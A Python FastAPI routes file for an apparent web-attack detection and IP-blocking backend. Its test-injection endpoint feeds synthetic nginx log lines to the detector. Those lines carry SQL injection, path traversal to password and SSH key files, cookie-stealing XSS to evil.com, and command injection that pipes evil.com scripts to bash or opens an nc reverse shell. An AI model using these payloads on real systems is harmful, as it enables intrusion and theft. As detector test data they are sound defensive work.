"""
FastAPI route definitions for the Cyber Defense Agent backend.
"""

import asyncio
import logging
from datetime import datetime
from typing import Any, Dict, List

from fastapi import APIRouter, HTTPException, Query, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse

from backend.api.models import (
    AttackResponse,
    BlockedIPResponse,
    BlockIPRequest,
    DefenseModeRequest,
    HealthResponse,
    StatsResponse,
    UnblockIPRequest,
    WhitelistRequest,
)
from backend.monitoring.storage import LogStorage, DefenseStorage
from backend.monitoring.metrics_collector import MetricsCollector

logger = logging.getLogger(__name__)

router = APIRouter()

# These are injected from main.py
_log_storage: LogStorage = None
_defense_storage: DefenseStorage = None
_defense_engine = None
_analyzer = None
_metrics_collector = MetricsCollector()

# WebSocket connection manager
_ws_connections: List[WebSocket] = []


def init_routes(log_storage, defense_storage, defense_engine, analyzer):
    global _log_storage, _defense_storage, _defense_engine, _analyzer
    _log_storage = log_storage
    _defense_storage = defense_storage
    _defense_engine = defense_engine
    _analyzer = analyzer


# ------------------------------------------------------------------
# Health
# ------------------------------------------------------------------

@router.get("/health", response_model=HealthResponse, tags=["health"])
async def health_check():
    ollama_status = "unknown"
    if _analyzer:
        health = _analyzer.check_ollama_health()
        ollama_status = "ready" if health.get("available") else "unavailable"

    db_status = "connected"
    try:
        if _log_storage:
            _log_storage.get_recent_attacks(limit=1)
    except Exception:
        db_status = "error"

    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "services": {
            "database": db_status,
            "ollama": ollama_status,
            "defense_engine": "active" if _defense_engine else "unavailable",
        },
        "defense_mode": {
            "auto_block": _defense_engine._auto_block if _defense_engine else False,
            "dry_run": _defense_engine._dry_run if _defense_engine else True,
        },
    }


# ------------------------------------------------------------------
# Attacks
# ------------------------------------------------------------------

@router.get("/api/attacks/recent", tags=["attacks"])
async def get_recent_attacks(limit: int = Query(default=20, ge=1, le=200)):
    if not _log_storage:
        raise HTTPException(503, "Storage not initialised")
    attacks = _log_storage.get_recent_attacks(limit=limit)
    return {"attacks": attacks, "total": len(attacks)}


@router.get("/api/stats/attacks", response_model=StatsResponse, tags=["stats"])
async def get_attack_stats(days: int = Query(default=7, ge=1, le=90)):
    if not _log_storage:
        raise HTTPException(503, "Storage not initialised")
    return _log_storage.get_attack_stats(days=days)


# ------------------------------------------------------------------
# Defense
# ------------------------------------------------------------------

@router.get("/api/defense/blocked-ips", tags=["defense"])
async def get_blocked_ips():
    if not _defense_storage:
        raise HTTPException(503, "Storage not initialised")
    ips = _defense_storage.get_blocked_ips()
    return {"blocked_ips": ips, "total": len(ips)}


@router.post("/api/defense/block-ip", tags=["defense"])
async def block_ip(req: BlockIPRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.manual_block(req.ip, req.reason, req.duration)
    if not result["success"]:
        raise HTTPException(500, "IP block operation failed")
    return {
        "success": True,
        "message": f"IP {req.ip} blocked successfully",
        "unblock_time": result.get("unblock_at"),
    }


@router.post("/api/defense/unblock-ip", tags=["defense"])
async def unblock_ip(req: UnblockIPRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.manual_unblock(req.ip)
    return {
        "success": result["success"],
        "message": f"IP {req.ip} unblocked",
    }


@router.post("/api/defense/emergency-unblock", tags=["defense"])
async def emergency_unblock():
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    result = _defense_engine.emergency_unblock_all()
    return result


@router.post("/api/defense/mode", tags=["defense"])
async def set_defense_mode(req: DefenseModeRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    if req.auto_block is not None:
        _defense_engine.set_auto_block(req.auto_block)
    if req.dry_run is not None:
        _defense_engine.set_dry_run(req.dry_run)
    return {
        "auto_block": _defense_engine._auto_block,
        "dry_run": _defense_engine._dry_run,
    }


# ------------------------------------------------------------------
# Whitelist
# ------------------------------------------------------------------

@router.get("/api/whitelist", tags=["whitelist"])
async def get_whitelist():
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    return {"whitelist": _defense_engine.whitelist.list_all()}


@router.post("/api/whitelist/add", tags=["whitelist"])
async def add_to_whitelist(req: WhitelistRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    _defense_engine.whitelist.add(req.ip, req.reason)
    return {"success": True, "message": f"IP {req.ip} added to whitelist"}


@router.post("/api/whitelist/remove", tags=["whitelist"])
async def remove_from_whitelist(req: WhitelistRequest):
    if not _defense_engine:
        raise HTTPException(503, "Defense engine not initialised")
    _defense_engine.whitelist.remove(req.ip)
    return {"success": True, "message": f"IP {req.ip} removed from whitelist"}


# ------------------------------------------------------------------
# Metrics
# ------------------------------------------------------------------

@router.get("/api/metrics/system", tags=["metrics"])
async def system_metrics():
    return _metrics_collector.get_metrics()


# ------------------------------------------------------------------
# LLM / Analysis
# ------------------------------------------------------------------

@router.post("/api/analysis/analyze", tags=["analysis"])
async def analyze_attack(attack_data: Dict[str, Any], request_data: Dict[str, Any] = None):
    if not _analyzer:
        raise HTTPException(503, "LLM analyzer not initialised")
    result = _analyzer.analyze_attack(attack_data, request_data or {})
    return result


@router.get("/api/analysis/ollama-health", tags=["analysis"])
async def ollama_health():
    if not _analyzer:
        raise HTTPException(503, "LLM analyzer not initialised")
    return _analyzer.check_ollama_health()


# ------------------------------------------------------------------
# Vulnerability Scanner & Attack Simulator
# ------------------------------------------------------------------

@router.post("/api/scan/run", tags=["scanning"])
async def run_vulnerability_scan():
    try:
        from backend.scanning.vulnerability_scanner import VulnerabilityScanner
        scanner = VulnerabilityScanner(storage=_defense_storage)
        result = await scanner.run_scan()
        return result
    except Exception as exc:
        raise HTTPException(500, f"Scan failed: {exc}")


@router.get("/api/scan/results", tags=["scanning"])
async def get_scan_results():
    if not _defense_storage:
        raise HTTPException(503, "Storage not initialised")
    return {"results": _defense_storage.get_scan_results()}


@router.post("/api/simulate/attacks", tags=["scanning"])
async def simulate_attacks():
    try:
        from backend.scanning.attack_simulator import AttackSimulator
        sim = AttackSimulator()
        result = await sim.run_all()
        return result
    except Exception as exc:
        raise HTTPException(500, f"Simulation failed: {exc}")


# ------------------------------------------------------------------
# Test injection endpoint — directly processes fake log lines
# ------------------------------------------------------------------

@router.post("/api/test/inject", tags=["testing"])
async def inject_test_attacks():
    """Directly inject test attack log lines into the detection pipeline."""
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.defense.defense_engine import DefenseEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer
    from datetime import datetime
    import asyncio

    ts = datetime.utcnow().strftime("%d/%b/%Y:%H:%M:%S +0000")

    # Helper to build a log line
    def line(ip, method, path, status, size, ua, ref="-"):
        return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'

    CHROME  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
    FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    MOBILE  = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1"
    CURL    = "curl/7.68.0"

    test_lines = [
        # ── Normal traffic (should NOT be detected) ───────────────────────────
        line("5.5.5.5",   "GET",  "/",                          200, 4096,  CHROME),
        line("5.5.5.5",   "GET",  "/index.html",                200, 8192,  CHROME),
        line("5.5.5.5",   "GET",  "/about",                     200, 3200,  CHROME),
        line("5.5.5.5",   "GET",  "/products?category=shoes",   200, 5120,  CHROME),
        line("5.5.5.5",   "GET",  "/api/health",                200, 64,    CURL),
        line("6.6.6.6",   "POST", "/login",                     200, 256,   FIREFOX),   # successful login
        line("6.6.6.6",   "GET",  "/dashboard",                 200, 12288, FIREFOX),
        line("6.6.6.6",   "GET",  "/profile?id=42",             200, 2048,  FIREFOX),
        line("7.7.7.7",   "GET",  "/search?q=blue+jeans",       200, 3072,  MOBILE),
        line("7.7.7.7",   "GET",  "/images/logo.png",           200, 15360, MOBILE),
        line("7.7.7.7",   "GET",  "/static/app.js",             200, 51200, MOBILE),
        line("8.8.8.8",   "GET",  "/api/products?page=1",       200, 4096,  CHROME),
        line("8.8.8.8",   "GET",  "/api/products?page=2",       200, 4096,  CHROME),
        line("9.9.9.9",   "GET",  "/contact",                   200, 2048,  FIREFOX),
        line("9.9.9.9",   "POST", "/contact",                   302, 128,   FIREFOX),
        line("10.10.10.10","GET", "/blog/post-1",               200, 6144,  CHROME),
        line("10.10.10.10","GET", "/blog/post-2",               200, 7168,  CHROME),
        line("11.22.33.44","GET", "/favicon.ico",               200, 1024,  CHROME),
        line("11.22.33.44","GET", "/robots.txt",                200, 128,   CURL),
        line("12.34.56.78","GET", "/sitemap.xml",               200, 2048,  CHROME),
        # 404s and errors — normal, not attacks
        line("5.5.5.5",   "GET",  "/old-page",                  404, 512,   CHROME),
        line("6.6.6.6",   "GET",  "/missing-image.jpg",         404, 256,   FIREFOX),
        line("7.7.7.7",   "POST", "/api/comment",               500, 128,   MOBILE),

        # ── SQL Injection — multiple variants ─────────────────────────────────
        line("11.11.11.11","GET", "/login?user=' OR '1'='1--&pass=x",                    401, 512,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/login?user=admin' UNION SELECT username,password FROM users--", 401, 256, "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/search?q=1'; DROP TABLE users--",                    200, 256,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/api?id=1 AND SLEEP(5)--",                            200, 256,  "sqlmap/1.7.8"),
        line("11.11.11.11","GET", "/item?id=1 OR 1=1",                                   200, 512,  "sqlmap/1.7.8"),
        line("111.111.111.111","GET", "/login?user=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", 500, 256, CURL),
        line("111.111.111.111","GET", "/api/user?id=1 UNION SELECT null,table_name FROM information_schema.tables--", 200, 1024, CURL),
        line("222.222.222.222","GET", "/product?id=1; EXEC xp_cmdshell('whoami')--",     500, 128,  CURL),
        line("222.222.222.222","GET", "/search?q=' OR BENCHMARK(5000000,MD5(1))--",      200, 256,  CURL),

        # ── Brute Force — 8 attempts same IP ──────────────────────────────────
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        line("22.22.22.22","POST", "/login", 401, 256, "python-requests/2.31"),
        # Second brute force attacker targeting /admin
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        line("123.123.123.123","POST", "/admin/login", 403, 256, "Hydra/9.4"),
        # wp-login brute force
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),
        line("234.234.234.234","POST", "/wp-login.php", 401, 256, "WPScan/3.8.22"),

        # ── Path Traversal — multiple targets ─────────────────────────────────
        line("33.33.33.33","GET", "/files?file=../../../../etc/passwd",          200, 1024, CURL),
        line("33.33.33.33","GET", "/files?file=../../../../.ssh/id_rsa",         200, 512,  CURL),
        line("33.33.33.33","GET", "/download?path=..%2F..%2F..%2Fetc%2Fshadow", 200, 512,  CURL),
        line("33.33.33.33","GET", "/static?file=../../../../etc/hosts",          200, 256,  CURL),
        line("33.33.33.33","GET", "/view?f=../../../../proc/self/environ",       200, 2048, CURL),
        line("33.33.33.33","GET", "/img?src=../../../../var/www/html/.env",      200, 512,  CURL),
        line("133.133.133.133","GET", "/read?file=....//....//etc/passwd",       200, 1024, CURL),
        line("133.133.133.133","GET", "/load?path=%252e%252e%252fetc%252fpasswd",200, 1024, CURL),
        line("133.133.133.133","GET", "/file?name=C:\\Windows\\System32\\config\\SAM", 200, 512, CURL),

        # ── XSS — reflected, stored, DOM ──────────────────────────────────────
        line("44.44.44.44","GET", "/search?q=<script>alert(document.cookie)</script>",  200, 2048, CHROME),
        line("44.44.44.44","GET", "/search?q=<img src=x onerror=alert(1)>",             200, 2048, CHROME),
        line("44.44.44.44","GET", "/page?name=javascript:alert(document.cookie)",       200, 2048, CHROME),
        line("44.44.44.44","GET", "/comment?text=<svg onload=alert(1)>",                200, 2048, CHROME),
        line("44.44.44.44","GET", "/profile?bio=<script>fetch('http://evil.com?c='+document.cookie)</script>", 200, 2048, CHROME),
        line("144.144.144.144","GET", "/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", 200, 2048, FIREFOX),
        line("144.144.144.144","GET", "/name?v=<iframe src=javascript:alert(1)>",       200, 2048, FIREFOX),
        line("144.144.144.144","GET", "/msg?t=<body onload=document.location='http://evil.com?'+document.cookie>", 200, 2048, FIREFOX),

        # ── Command Injection — various shells ────────────────────────────────
        line("55.55.55.55","GET", "/cmd?host=localhost;cat /etc/passwd",         200, 512,  CURL),
        line("55.55.55.55","GET", "/cmd?host=127.0.0.1|id",                     200, 256,  CURL),
        line("55.55.55.55","GET", "/run?cmd=/bin/bash -i",                       200, 256,  CURL),
        line("55.55.55.55","GET", "/exec?c=wget http://evil.com/shell.sh",       200, 256,  CURL),
        line("55.55.55.55","GET", "/ping?host=x;curl http://evil.com/c2|bash",   200, 256,  CURL),
        line("155.155.155.155","GET", "/diag?ip=$(cat /etc/passwd)",             200, 1024, CURL),
        line("155.155.155.155","GET", "/tool?cmd=`whoami`",                      200, 128,  CURL),
        line("155.155.155.155","GET", "/net?host=x && nc -e /bin/sh evil.com 4444", 200, 256, CURL),
        line("155.155.155.155","GET", "/run?x=x;python3 -c 'import socket,subprocess'", 200, 256, CURL),

        # ── Bot Scanners — various tools ──────────────────────────────────────
        line("66.66.66.66",   "GET", "/",                    200, 4096, "sqlmap/1.7.8"),
        line("77.77.77.77",   "GET", "/",                    200, 4096, "Nikto/2.1.6"),
        line("88.88.88.88",   "GET", "/",                    200, 4096, "masscan/1.0"),
        line("99.99.99.99",   "GET", "/admin",               200, 4096, "dirbuster/1.0"),
        line("100.100.100.100","GET","/wp-login.php",        200, 4096, "zgrab/0.x"),
        line("101.101.101.101","GET","/",                    200, 4096, "Nessus/10.0"),
        line("102.102.102.102","GET","/",                    200, 4096, "OpenVAS/9.0"),
        line("103.103.103.103","GET","/",                    200, 4096, "Metasploit/6.3"),
        line("104.104.104.104","GET","/",                    200, 4096, "python-requests/2.28"),
        line("105.105.105.105","GET","/",                    200, 4096, "libwww-perl/6.67"),
        line("106.106.106.106","GET","/",                    200, 4096, "WPScan/3.8.22"),
        line("107.107.107.107","GET","/",                    200, 4096, "Acunetix/14.0"),
        # Directory enumeration
        line("88.88.88.88",   "GET", "/admin",               404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/backup",              404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/.git/config",         404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/config.php",          404, 256,  "dirbuster/1.0"),
        line("88.88.88.88",   "GET", "/.env",                404, 256,  "dirbuster/1.0"),
    ]

    parser = NginxLogParser()
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False  # use fast fallback, don't wait for Ollama

    # Use the global defense engine so blocks are real and persistent
    defense = _defense_engine

    results = []
    normal_count = 0
    for line in test_lines:
        parsed = parser.parse(line)
        if not parsed:
            continue
        request_id = _log_storage.save_request(parsed)
        detections = engine.analyze_request(parsed)
        if detections:
            top = detections[0]
            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
            defense_result = defense.execute_defense(top)
            blocked = defense_result.get("action") == "BLOCK_IP"
            if blocked:
                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
            analysis = analyzer.analyze_attack(top, parsed)
            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
            await broadcast_attack({
                "id": request_id,
                "timestamp": parsed.get("timestamp"),
                "ip": parsed.get("ip"),
                "method": parsed.get("method"),
                "path": parsed.get("path"),
                "status": parsed.get("status"),
                "user_agent": parsed.get("user_agent"),
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "defense_action": defense_result.get("action"),
            })
            results.append({
                "ip": parsed["ip"],
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
            })
        else:
            normal_count += 1

    return {
        "injected": len(test_lines),
        "normal_requests": normal_count,
        "detected": len(results),
        "attacks": results,
    }


# ------------------------------------------------------------------
# Chrome Extension API endpoints
# ------------------------------------------------------------------

@router.post("/api/extension/report", tags=["extension"])
async def extension_report(data: dict):
    """Receive scan reports from the Chrome extension."""
    with __import__("backend.monitoring.storage", fromlist=["get_connection"]).get_connection() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS extension_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                domain TEXT NOT NULL,
                url TEXT,
                risk_level TEXT,
                score INTEGER,
                is_https INTEGER,
                issues TEXT,
                action TEXT,
                scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        import json as _json
        conn.execute("""
            INSERT INTO extension_scans (domain, url, risk_level, score, is_https, issues, action)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            data.get("domain", ""),
            data.get("url", ""),
            data.get("riskLevel", data.get("risk_level", "UNKNOWN")),
            data.get("score"),
            int(data.get("isHTTPS", data.get("is_https", False))),
            _json.dumps(data.get("issues", [])),
            data.get("action", "SCAN"),
        ))
    return {"success": True}


@router.get("/api/extension/scans", tags=["extension"])
async def get_extension_scans(limit: int = Query(default=50, ge=1, le=200)):
    """Get recent extension scan results for the dashboard."""
    import json as _json
    from backend.monitoring.storage import get_connection
    try:
        with get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS extension_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL,
                    url TEXT,
                    risk_level TEXT,
                    score INTEGER,
                    is_https INTEGER,
                    issues TEXT,
                    action TEXT,
                    scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            rows = conn.execute(
                "SELECT * FROM extension_scans ORDER BY scanned_at DESC LIMIT ?", (limit,)
            ).fetchall()
        scans = []
        for r in rows:
            d = dict(r)
            if d.get("issues") and isinstance(d["issues"], str):
                try: d["issues"] = _json.loads(d["issues"])
                except: d["issues"] = []
            scans.append(d)
        return {"scans": scans, "total": len(scans)}
    except Exception as e:
        return {"scans": [], "total": 0}


@router.get("/api/extension/stats", tags=["extension"])
async def get_extension_stats():
    """Aggregated stats for the extension dashboard section."""
    import json as _json
    from backend.monitoring.storage import get_connection
    try:
        with get_connection() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS extension_scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL,
                    url TEXT,
                    risk_level TEXT,
                    score INTEGER,
                    is_https INTEGER,
                    issues TEXT,
                    action TEXT,
                    scanned_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            total = conn.execute("SELECT COUNT(*) FROM extension_scans").fetchone()[0]
            by_risk = conn.execute(
                "SELECT risk_level, COUNT(*) as cnt FROM extension_scans GROUP BY risk_level"
            ).fetchall()
            blocked = conn.execute(
                "SELECT COUNT(*) FROM extension_scans WHERE action='BLOCKED'"
            ).fetchone()[0]
            unsafe_https = conn.execute(
                "SELECT COUNT(*) FROM extension_scans WHERE is_https=0"
            ).fetchone()[0]
            recent_domains = conn.execute(
                "SELECT DISTINCT domain, risk_level, score, scanned_at FROM extension_scans ORDER BY scanned_at DESC LIMIT 10"
            ).fetchall()
        return {
            "total_scans": total,
            "by_risk": {r["risk_level"]: r["cnt"] for r in by_risk if r["risk_level"]},
            "blocked_count": blocked,
            "unsafe_http_count": unsafe_https,
            "recent_domains": [dict(r) for r in recent_domains],
        }
    except Exception as e:
        return {"total_scans": 0, "by_risk": {}, "blocked_count": 0, "unsafe_http_count": 0, "recent_domains": []}


@router.post("/api/test/inject-custom", tags=["testing"])
async def inject_custom_attacks(payload: dict):
    """Inject custom log lines for individual attack type testing."""
    from backend.monitoring.log_parser import NginxLogParser
    from backend.detection.detection_engine import AttackDetectionEngine
    from backend.analysis.llm_analyzer import LLMAnalyzer

    lines = payload.get("lines", [])
    parser = NginxLogParser()
    engine = AttackDetectionEngine()
    analyzer = LLMAnalyzer()
    analyzer._available = False

    results = []
    for line in lines:
        parsed = parser.parse(line)
        if not parsed:
            continue
        request_id = _log_storage.save_request(parsed)
        detections = engine.analyze_request(parsed)
        if detections:
            top = detections[0]
            _log_storage.mark_attack(request_id, top["attack_type"], top["severity"])
            defense_result = _defense_engine.execute_defense(top)
            blocked = defense_result.get("action") == "BLOCK_IP"
            if blocked:
                _log_storage.mark_attack(request_id, top["attack_type"], top["severity"], blocked=True)
            analysis = analyzer.analyze_attack(top, parsed)
            _defense_storage.save_ai_analysis(request_id, top["attack_type"], analysis)
            await broadcast_attack({
                "id": request_id,
                "timestamp": parsed.get("timestamp"),
                "ip": parsed.get("ip"),
                "method": parsed.get("method"),
                "path": parsed.get("path"),
                "status": parsed.get("status"),
                "user_agent": parsed.get("user_agent"),
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
                "defense_action": defense_result.get("action"),
            })
            results.append({
                "ip": parsed["ip"],
                "attack_type": top["attack_type"],
                "severity": top["severity"],
                "blocked": blocked,
            })

    return {"injected": len(lines), "detected": len(results), "attacks": results}


# ------------------------------------------------------------------
# WebSocket live feed
# ------------------------------------------------------------------

@router.websocket("/ws/attacks")
async def websocket_attacks(websocket: WebSocket):
    await websocket.accept()
    _ws_connections.append(websocket)
    try:
        while True:
            # Keep-alive ping every 30 s
            await asyncio.sleep(30)
            await websocket.send_json({"type": "ping"})
    except WebSocketDisconnect:
        _ws_connections.remove(websocket)
    except Exception:
        if websocket in _ws_connections:
            _ws_connections.remove(websocket)


async def broadcast_attack(attack: Dict):
    """Broadcast a new attack event to all connected WebSocket clients."""
    dead = []
    for ws in list(_ws_connections):
        try:
            await ws.send_json({"type": "new_attack", "data": attack})
        except Exception:
            dead.append(ws)
    for ws in dead:
        _ws_connections.remove(ws)
